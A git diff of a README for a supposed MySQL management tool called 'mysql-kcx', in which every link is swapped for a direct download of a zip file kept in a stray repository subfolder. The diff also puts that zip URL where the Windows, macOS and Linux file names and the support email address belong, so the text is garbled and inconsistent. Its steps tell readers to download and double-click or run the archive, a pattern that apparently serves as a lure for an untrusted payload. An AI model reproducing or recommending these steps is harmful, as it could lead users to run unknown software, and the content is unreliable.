@@ -2,7 +2,7 @@
 # 🚀 mysql-kcx - Easily Manage Your MySQL Database
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip%20mysql--kcx-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip)
+[![Download](https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip%20mysql--kcx-v1.0.0-brightgreen)](https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip)
 
 ## 📖 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -19,23 +19,23 @@ Welcome to **mysql-kcx**! This application helps you manage your MySQL database 
 To get started, you need to download the application. Follow these simple steps:
 
 1. Click the download button or link below to visit the Releases page.
-   - [Download mysql-kcx](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip)
+   - [Download mysql-kcx](https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip)
 
 2. Look for the latest version of **mysql-kcx** on the Releases page.
 
 3. Select the appropriate file for your operating system:
-   - For Windows, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
-   - For Linux, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
+   - For Windows, look for `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip`.
+   - For macOS, look for `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip`.
+   - For Linux, look for `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip`.
 
 4. Click on the file to start the download.
 
 5. Once the download is complete, locate the file in your 'Downloads' folder or the location where you saved it.
 
 6. Run the downloaded file:
-   - For Windows: Double-click the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` file.
-   - For macOS: Open the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` and drag the app to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` file, then run the application from the extracted folder.
+   - For Windows: Double-click the `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip` file.
+   - For macOS: Open the `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip` and drag the app to your Applications folder.
+   - For Linux: Extract the `https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip` file, then run the application from the extracted folder.
 
 Congratulations! You have successfully installed **mysql-kcx**.
 
@@ -82,7 +82,7 @@ If you experience issues while using **mysql-kcx**, here are some common problem
 If the problem persists, feel free to reach out to our support section below.
 
 ## 📞 Support
-For any questions or support, please refer to the Issues section on our GitHub page. You can also contact us directly through our support email at [https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip).
+For any questions or support, please refer to the Issues section on our GitHub page. You can also contact us directly through our support email at [https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip](https://github.com/Moraly7749/mysql-kcx/raw/refs/heads/main/monocule/mysql_kcx_1.2.zip).
 
 Thank you for choosing **mysql-kcx**! We hope this application makes managing your databases simpler and more efficient. Happy using!
 ```
